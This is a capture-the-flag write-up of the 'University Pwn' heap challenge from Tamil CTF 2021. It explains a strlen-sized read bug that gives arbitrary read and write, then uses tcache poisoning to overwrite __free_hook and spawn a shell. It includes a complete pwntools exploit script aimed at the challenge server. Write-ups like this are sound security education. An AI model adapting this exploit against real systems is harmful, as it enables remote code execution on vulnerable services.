**University Pwn**

was a pwn challenge from Tamil CTF 2021.

A heap exploitation challenge, I got firstblood on it, let's see what is it...

let's check the protections:

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/University.Pwn/pics/checksec.png)

The program present an archetypal heap exploitation menu, covered by a thin layer of obscurity..

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/University.Pwn/pics/menu.png)

so you can create sheets, with various information about a "student".

You can create up to 30 sheets, they incrementally numbered from 0 to 29.

The sheets are recorded on a buffer on stack.

For each sheet, you can allocate a block of a size between 0x18 to 0x88 bytes on heap,

and fill it with "record" data for students.

From the menu, you can also edit the sheet content, including his "record" stored on heap.

You can also view the content of a sheet's record.

And you can delete a record from a sheet.

Each time you create a sheet, an index number is incremented, and you can not create more than 30 sheets. When you free a record, this number is not decremented, and each create sheet will go in the next index.. (no index reuse)

the sheet structure looks like this:

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/University.Pwn/pics/sheet.struct.png)

the program has not vulnerabilities like an uaf, double free, overflow or other things...

the vulnerability is somewhere else..devil is in the details as you know.

there are 30 sheets reserved on stack.



### **1:  the Vulnerability**

<u>One first thing to note is:</u> 

During sheet creation ,remarks entry in the sheet structure, is directly read from user input, by a read() function, and is not zero terminated. It is just before the record_ptr pointer, that points to our bloc allocated on heap.

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/University.Pwn/pics/note1.png)

<u>second things to note (where the vulnerability lies):</u>

In the edit function,

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/University.Pwn/pics/note2.png)

when you edit the sheet (called Re-evaluate a answer sheet in the menu),

the edit function check the length of remark with strlen, and use the size returned by strlen for the read() function that read input from the user.

That is very bad, because if during creation of sheet, we fill the remarks up to the end with 56 chars, the strlen will return the length of the remarks + the length of the record_ptr just after.

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/University.Pwn/pics/vuln1.png)

And then we can change the record_ptr with the following read() function.

and the last read() that edit the record, is read(0, record_ptr, record_size)

it is basically a read/write primitive for us.. we just have to create a sheet with 56 chars that fill the remarks entry,  then to edit this sheet to modify record_ptr to points where we want to read or write, and to write what we want to this address while editing record entry..

With the "View the answer sheet" function from menu, we can also read from this address.

In the edit function above, the author of the challenge even include a check to see if record_ptr is less than 0x7effffffffff,

to forbid writing directly in libc with the write primitive.

Which would make the exploitation even more easy..



### **2:  the Exploitation**

Ok, with our write/read primitive, exploitation is easy.

We will proceed like this.

first we create 4 sheets/bloc on heap

like this:

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/University.Pwn/pics/phase1.png)

then we will free first the bloc 0, to put a heap address on heap (the bk pointer of the freed bloc)

We then edit the bloc1 heap pointer with the edit vulnerability, to make it points to the bk pointer of just freed bloc 0

We leak this address, with the show() function of menu.

Now we know where the heap is in memory.

now we are gonna to make a simple attack on tcache_perthread_struct, that is the first allocated bloc on heap, and where the tcache metadata are stored (number of tcache in each lists, previous freed bloc addres, etc)

for libc-2.31 it looks like this

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/University.Pwn/pics/tcache1.png)

the counts which are now coded on 16bit, record the number of blocs already in the tcache (a maximum of 7 normally).

And the entry record the address of the next bloc in a tcache (the one that will be given first)

So first we will use our write primitive to set tcache.counts to 7, for the 0x90 tcache blocs (our 0x88 blocs fall in this category)

So the malloc system will think this tcache is already full.

Next we free the bloc 2 (0x88 size), as his tcache is supposed to be full, it will be put in unsorted bins.

That will put two libc addresses in the freed bloc metada in his fd/bk pointers.

so now we edit bloc 1, and we use our read/write primitive, to read these libc address leaved in bk/fd, and calculate the libc base address.

now we edit again bloc 1, and use our read/write primitive to write the in the tcache_entry of bloc of size 0x20, we replace the next block address, by _free_hook address in libc (a bit before in fact)

then we allocate a bloc 0x18 size(fells in the 0x20 tcache), it will return us a bloc pointing to _free_hook

We write '/bin/sh' a bit before _free_hook, and the address of system() in _free_hook.

then immediatly we free this bloc, and a system('/bin/sh') will be called...

and that's all :)

see it in action:

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/University.Pwn/pics/gotshell.gif)



Here is the exploit code commented:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./akka_university')
libc = ELF('./libc.so.6')

host, port = "3.99.48.161", "9006"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

def add(size, name, marks, remarks, log ):
  p.sendlineafter('>>','1')
  p.sendlineafter('record\n>>', str(size))
  p.sendafter('name\n>>', name)		# max size 0x14 (20)
  p.sendlineafter('marks\n>>', str(marks))	# int between 40 to 100 (dword)
  p.sendafter('Students\n>>', remarks)		# max size 0x38 (56)
  p.sendafter('paper\n>>', log)			# malloc bloc allocated size

def adda(size, data):
  add(size, 'A'*0x14, 40, 'B'*0x38, data)

def free(idx):
  p.sendlineafter('>>','2')
  p.sendlineafter('record\n>>', str(idx))

def show(idx):
  p.sendlineafter('>>','3')
  p.sendlineafter('view\n>>', str(idx))

def edit(idx, name, marks, remarks, log):
  p.sendlineafter('>>','4')
  p.sendlineafter('edit\n>>', str(idx))
  p.sendlineafter('name\n>>', name)
  p.sendlineafter('marks\n>>', str(marks))      # int between 40 to 100 (dword)
  p.sendafter('Students\n>>', remarks)          # max size 0x38 (56)
  p.sendafter('paper\n>>', log)                 # malloc bloc allocated size

adda(0x18, 'A')		# bloc 0   --> no use we just free it to get a heap address
adda(0x18, 'B')		# bloc 1   --> we will use this one, to write on the heap, via the edit function vulnerability
adda(0x88, 'C')		# bloc 2   --> this one will be freed to go in unsorted, and get a libc leak
adda(0x38, 'D')		# bloc 3  --> stop bloc
free(0)			# we free the first bloc, to put a heap address on heap for our leak

# modify heap address of bloc1 to point on freed bloc 0 bk pointer
edit(1, 'A'*0x14, 40, 'a'*56+'\xa8', '\x10')
show(1)
p.recvuntil('contents\n', drop=True)
leak1 = u64(p.recv(8))
print('leak heap = '+hex(leak1))
heap_base = leak1-0x10

# set 0x90 tcache->counts to 7 (full tcache)
edit(1, 'A'*0x14, 40, b'a'*56+p16((leak1+14) & 0xffff), '\x07')

# as there is now 7 (non existing) blocs in tcache 0x90 list, freeing a 0x88 bloc , will go in unsorted
free(2)

# edit bloc 1 heap address, to make it point to bk/fd libc pointers leaved by freeing 0x88 bloc
edit(1, 'A'*0x14, 40, b'a'*56+p16((leak1+0x2d0) & 0xffff), '\xe0')

show(1)
# get our libc leak & calculate libc base
p.recvuntil('contents\n', drop=True)
leak2 = u64(p.recv(8))
print('leak libc = '+hex(leak2))
libc.address = leak2 - 0x1ebbe0
print('libc base = '+hex(libc.address))

# now modify head pointer of 0x20 blocs in tcache to points to __free_hook-16 (__free_hook-8 could works also but not in later libc, because of alignement)
edit(1, '/bin/sh'.ljust(0x14,'\x00'), 40, b'a'*56+p16((leak1+0x80) & 0xffff), p64(libc.symbols['__free_hook']-16) )

# get an allocation near __free_hook, put '/bin/sh' string in the qword before __free_hook, and system address in __free_hook
adda(0x18, b'/bin/sh'.ljust(16,b'\x00')+p64(libc.symbols['system']))	# bloc 4

# when free will be called on bloc 4 , system('/bin/sh') well be executed
free(4)

p.interactive()
```

*nobodyisnobody still pwning things...*